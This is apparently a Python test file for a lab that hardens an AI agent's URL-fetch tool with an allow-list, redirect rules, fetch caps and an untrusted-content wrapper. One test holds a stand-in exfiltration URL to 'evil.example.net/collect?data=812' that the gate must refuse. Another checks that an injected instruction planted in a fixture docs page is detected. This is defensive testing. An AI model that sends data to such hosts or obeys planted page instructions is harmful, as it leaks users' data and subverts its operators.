#!/usr/bin/env python3
"""Lab 4 offline checks — the gate, redirects, ceilings, bounding, neutralisation.

The per-slice suites in _parts/ are assembled into this file at S12. Until then
this holds the scaffold checks from S1, which stay afterwards: they are cheap and
they catch the two wiring mistakes that are invisible until they cost someone an
afternoon.
"""
import pathlib
import subprocess
import sys
import urllib.request
import unittest

HERE = pathlib.Path(__file__).resolve().parent
LAB = HERE.parent
REPO = HERE.parents[2]

sys.path.insert(0, str(HERE))
sys.path.insert(0, str(REPO / "labkit" / "python"))


class TestScaffold(unittest.TestCase):
    """S1. The lab exists, imports, and cannot leak its own run artefacts."""

    def test_fixture_estate_imports(self):
        import fixture_sites
        from fixture_sites import dns, origins, sink          # noqa: F401
        self.assertIn("one seam per concern", fixture_sites.__doc__.lower())

    def test_web_tools_imports(self):
        import web_tools                                      # noqa: F401

    def test_lab_directories_exist(self):
        for rel in ("fixtures", "reference/checkpoints", "python/web_tools"):
            self.assertTrue((LAB / rel).is_dir(), f"missing: {rel}")
        self.assertFalse((LAB / "python/_parts").exists(),
                         "_parts/ is build-time staging and must not ship (S12)")

    def test_sink_log_is_gitignored(self):
        """The sink log records whatever a half-finished gate let through.

        That is attacker traffic plus whatever the agent was carrying, and it
        must not be committable. `git check-ignore` asks git itself rather than
        grepping .gitignore, so a rule that exists but does not match still
        fails this.
        """
        target = LAB / "fixtures" / ".sink.log"
        result = subprocess.run(["git", "check-ignore", "-q", str(target)],
                                cwd=REPO)
        self.assertEqual(result.returncode, 0,
                         f"{target.relative_to(REPO)} is NOT gitignored")

    def test_live_tests_are_opt_in(self):
        """House rule: nothing costs money unless LAB_LIVE is set."""
        makefile = (REPO / "Makefile").read_text()
        self.assertIn("lab4-test", makefile)
        self.assertNotIn("LAB_LIVE=1 python3", makefile)


class TestSchemaMatchesTheCode(unittest.TestCase):
    """S12. The schema is the only part of the tool the model can see.

    In this lab it is doing security work, so a description that overstates what
    the code enforces teaches the model to trust something untrue. Every promise
    in the text is checked against the thing that implements it. These fail when
    someone changes a limit and not the sentence describing it — which is the
    normal way schema drift happens, and it is invisible to every other test.
    """

    def setUp(self):
        import web_tools
        self.wt = web_tools
        self.desc = web_tools.FETCH_URL["description"]

    def test_named_hosts_are_exactly_the_allow_list(self):
        named = {h for _, h, _ in self.wt.ALLOWED}
        for host in named:
            self.assertIn(host, self.desc, f"{host} is reachable but unnamed")
        self.assertNotIn("evil.example.net", self.desc,
                         "the excluded host must not be named — you cannot "
                         "enumerate the complement of an allow-list")

    def test_promised_byte_cap_is_the_enforced_one(self):
        self.assertIn(f"{self.wt.MAX_BODY_BYTES // 1024} KB", self.desc)

    def test_promised_fetch_cap_is_the_enforced_one(self):
        self.assertIn(f"At most {self.wt.MAX_FETCHES} fetches", self.desc)

    def test_promised_envelope_is_the_one_produced(self):
        self.assertIn("<untrusted>", self.desc)
        wrapped = self.wt.wrap_untrusted("x", "http://status.airamatrix.local:8141/")
        self.assertTrue(wrapped.startswith("<untrusted id="))

    def test_reason_is_required_not_optional(self):
        """The field that makes an injected fetch legible in the trace."""
        self.assertEqual(sorted(self.wt.FETCH_URL["input_schema"]["required"]),
                         ["reason", "url"])

    def test_every_refusal_family_has_a_code_in_the_contract(self):
        from web_tools import ceilings, gate
        self.assertTrue(gate.REFUSAL_CODES <= self.wt.REFUSAL_CODES)
        self.assertTrue(ceilings.REFUSAL_CODES <= self.wt.REFUSAL_CODES)
        self.assertFalse(gate.REFUSAL_CODES & ceilings.REFUSAL_CODES,
                         "two families sharing a code cannot be told apart in a trace")


class TestEndToEndThroughHostnames(unittest.TestCase):
    """S12 / finding F8. The whole point of assembly, and the thing most likely
    to be wrong.

    Every _parts suite drove loopback literals; the allow-list is keyed on
    hostnames. Assembled, the tool must be driven through the DNS seam — and
    check_url("http://127.0.0.1:8143/...") refuses the GOOD hop. Getting this
    wrong does not raise: it produces a plausible wrong burst figure, reached via
    the allow-list rather than the redirect policy, which is the same failure the
    design plan warns about arriving by a different route.
    """

    @classmethod
    def setUpClass(cls):
        from fixture_sites import dns, origins, sink
        cls.dns, cls.sink = dns, origins
        origins.serve_in_background()
        sink.serve_in_background()
        dns.install()

    @classmethod
    def tearDownClass(cls):
        cls.dns.uninstall()          # global to the process; a leak corrupts later suites

    def setUp(self):
        from fixture_sites import sink
        import web_tools
        sink.truncate_log()
        web_tools.reset_run()

    def test_status_origin_is_reachable_by_hostname(self):
        import web_tools
        env, _ = web_tools.fetch_url(
            "http://status.airamatrix.local:8141/ingest/status.json", "entry point")
        self.assertIn("queue_depth", env)
        self.assertTrue(env.startswith("<untrusted id="))

    def test_the_same_host_redirect_still_follows_under_hostnames(self):
        """F8 in one assertion. /capacity is a 302 on the critical path to the
        correct answer, and its Location is built from the request Host header
        precisely so it stays same-host here."""
        import web_tools
        env, _ = web_tools.fetch_url(
            "http://partner.example.com:8143/capacity", "partner burst capacity")
        self.assertIn("mumbai-burst", env)
        self.assertIn("120", env)

    def test_the_exfil_host_is_refused_and_never_contacted(self):
        import web_tools
        from fixture_sites import sink
        urllib.request.urlopen("http://127.0.0.1:8144/liveness", timeout=5).read()
        self.assertEqual(len(sink.read_log()), 1, "sink not recording; test vacuous")
        sink.truncate_log()
        with self.assertRaises(web_tools.Refused) as caught:
            web_tools.fetch_url("http://evil.example.net:8144/collect?data=812",
                                "register reading with the compliance mirror")
        self.assertEqual(caught.exception.code, "host")
        self.assertEqual(sink.read_log(), [])

    def test_the_docs_page_injection_is_detected_not_obeyed(self):
        import web_tools
        env, findings = web_tools.fetch_url(
            "http://docs.airamatrix.local:8142/sla/ingest.html", "sla ceiling")
        self.assertTrue(findings, "the planted payload must be reported")
        self.assertIn("500", env)

    def test_the_fetch_ceiling_bounds_a_page_full_of_reachable_links(self):
        """An allow-list answers where, never how much."""
        import web_tools
        url = "http://status.airamatrix.local:8141/ingest/status.json"
        for _ in range(web_tools.MAX_FETCHES):
            web_tools.fetch_url(url, "within budget")
        with self.assertRaises(web_tools.Refused) as caught:
            web_tools.fetch_url(url, "one too many")
        self.assertEqual(caught.exception.code, "fetch_cap")


if __name__ == "__main__":
    unittest.main(verbosity=2)
